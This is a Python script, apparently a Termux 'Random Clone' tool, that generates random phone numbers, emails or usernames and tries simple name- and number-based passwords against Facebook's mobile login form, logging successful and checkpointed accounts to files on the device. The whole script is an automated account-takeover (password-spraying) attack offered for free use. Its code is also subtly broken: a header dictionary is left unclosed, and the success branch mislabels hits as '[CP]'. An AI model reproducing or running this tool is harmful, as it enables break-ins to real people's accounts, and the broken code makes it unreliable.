"#Code By Qaiser Abbas"
"#Using Pure Python Utf-8"
"#Best For Termux Users"
#Free To Use Dont Forget To Give Credits

"----Installing Modules ------"
import os,sys
try:
	import requests
except:
	os.system("pip install requests")

try:
	import colorama
except:
	os.system("pip install colorama")

"------Modules------"
from time import sleep
from re import search as qsr
from os import system
import random
from colorama import Fore, Back, Style

"-----Colors-----"
r = Fore.RED
g = Fore.GREEN 
c = Fore.CYAN
p = Fore.BLUE
s = Style.RESET_ALL

"-----Logo-----"
logo = f"""

$$\      $$\         $$\      $$\  $$$$$$\   $$$$$$\  $$\   $$\ $$$$$$\ $$\   $$\ 
$$$\    $$$ |        $$$\    $$$ |$$  __$$\ $$  __$$\ $$ |  $$ |\_$$  _|$$$\  $$ |
$$$$\  $$$$ |        $$$$\  $$$$ |$$ /  $$ |$$ /  \__|$$ |  $$ |  $$ |  $$$$\ $$ |
$$\$$\$$ $$ |$$$$$$\ $$\$$\$$ $$ |$$ |  $$ |\$$$$$$\  $$$$$$$$ |  $$ |  $$ $$\$$ |
$$ \$$$  $$ |\______|$$ \$$$  $$ |$$ |  $$ | \____$$\ $$  __$$ |  $$ |  $$ \$$$$ |
$$ |\$  /$$ |        $$ |\$  /$$ |$$ |  $$ |$$\   $$ |$$ |  $$ |  $$ |  $$ |\$$$ |
$$ | \_/ $$ |        $$ | \_/ $$ | $$$$$$  |\$$$$$$  |$$ |  $$ |$$$$$$\ $$ | \$$ |
\__|     \__|        \__|     \__| \______/  \______/ \__|  \__|\______|\__|  \__|
                                                                                  
                                                                                  
                                                                    

   
{(40*"=")}
\tAdmin : irtaza
\tTool  : Random Clone
\tVersion : 0.01
{(40*"=")}
"""
"-----Empty Values For Append ------"
mails=[]
ok=[]
cp=[]
loop=0
"-----Main-Menu-----"

def xmen():
	system("clear");print(logo)
	print("[1] Random Number Cloning")
	print("[2] Random Mail Cloning")
	print("[3] Random Username Cloning")
	print("[0] Exit")
	xmen=input("\n Select :")
	if xmen in ['1','01']:
		system("clear");print(logo)
		print(' [-] Example 92333,92304,92312')
		num = input(' Code : ')
		print(' [-] Limit 10000,2000,6000')
		limit = int(input(' Limit : '))
		if int(num) < int(5):
			exit("invalid type")
		for tot in range(limit):
			bz = random.randint(1111111,9999999)
			nm = ''.join(num+str(bz))
			mails.append(nm)
		system("clear");print(logo)
		print(" cloning is started .....")
		print(" it took time to print ok ....")
		print(40*"=")
		for id in mails:
			pw = [num+str(bz),bz]
			clone(id,pw,limit)
		print(" \ncloning is completed ")
		print(f" total ok {str(len(ok))}")
		exit()
			
	if xmen in ['2','02']:
		system("clear");print(logo)
		print(' [-] Example Ali,Qaiser,Syed')
		first = input(' First : ')
		print(' [-] Example khan,ali,ahmad')
		last = input(' Last : ')
		print(' [-] Example @gmail.com,@hotmail.com')
		domain = input(' First : ')
		print(' [-] Limit 10000,2000,6000')
		limit = int(input(' Limit : '))
		for tot in range(limit):
			bz = random.randint(99,9999)
			nm = ''.join(first+last+str(bz)+domain)
			mails.append(nm)
		system("clear");print(logo)
		print(" cloning is started .....")
		print(" it took time to print ok ....")
		print(40*"=")
		for id in mails:
			pw = [first+last,first,last]
			clone(id,pw,limit)
		print(" \ncloning is completed ")
		print(f" total ok {str(len(ok))}")
		exit()
		
	if xmen in ['3','03']:
		system("clear");print(logo)
		print(' [-] Example Ali,Qaiser,Syed')
		first = input(' First : ')
		print(' [-] Example khan,ali,ahmad')
		last = input(' Last : ')
		print(' [-] Limit 10000,2000,6000')
		limit = int(input(' Limit : '))
		for tot in range(limit):
			bz = random.randint(99,9999)
			nm = ''.join(first+last+str(bz))
			mails.append(nm)
		system("clear");print(logo)
		print(" cloning is started .....")
		print(" it took time to print ok ....")
		print(40*"=")
		for id in mails:
			pw = [first+last,first,last]
			clone(id,pw,limit)
		print(" \ncloning is completed ")
		print(f" total ok {str(len(ok))}")
		exit()
	if xmen in ['0','00']:
		exit("Thanks For Use")
	else:	exit(f"{r}Invalid Search{s}")

def clone(id,pw,limit):
	global ok,cp,loop
	for pas in pw:
		sys.stdout.write(f'\r {limit}/{loop} - {str(len(ok))}'),
		sys.stdout.flush()
		try:
			url = "https://free.facebook.com/login/device-based/regular/login/?refsrc"
			ro = requests.get('https://x.facebook.com').text
			hed = {'user-agent': 'Mozilla/5.0 (Linux; U; Android 13;  en-us; GT-C143Q) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4461.84 Mobile Safari/537.36', 'accept-encoding': 'gzip, deflate, br', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.8', 'Connection': 'keep-alive', 'authority': 'free.facebook.com',
            "method": 'GET',
            "scheme": 'https',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
            'cache-control': 'max-age=0',
            'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Linux"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
			dat = {"lsd":qsr('name="lsd" value="(.*?)"', str(ro)).group(1),"jazoest":qsr('name="jazoest" value="(.*?)"', str(ro)).group(1),"m_ts":qsr('name="m_ts" value="(.*?)"', str(ro)).group(1),"li":qsr('name="li" value="(.*?)"', str(ro)).group(1),"try_number":"0","unrecognized_tries":"0","email":id,"pass":pas,"login":"Log In"}
			r = requests.post(url,data=dat,headers=hed)
			if "checkpoint" in r.text:
				print(f"{r}[CP] {id} | {pas}{s}")
				cp.append(id)
				open("/sdcard/u_cp.txt",'a').write(id+' - '+pas)
				break
			elif 'c_user' in r.text:
				print(f"{g}[CP] {id} | {pas}{s}")
				ok.append(id)
				open("/sdcard/u_ok.txt",'a').write(id+' - '+pas)
				break
			else:
				pass
		except:
			pass
	loop+=1
		
xmen()
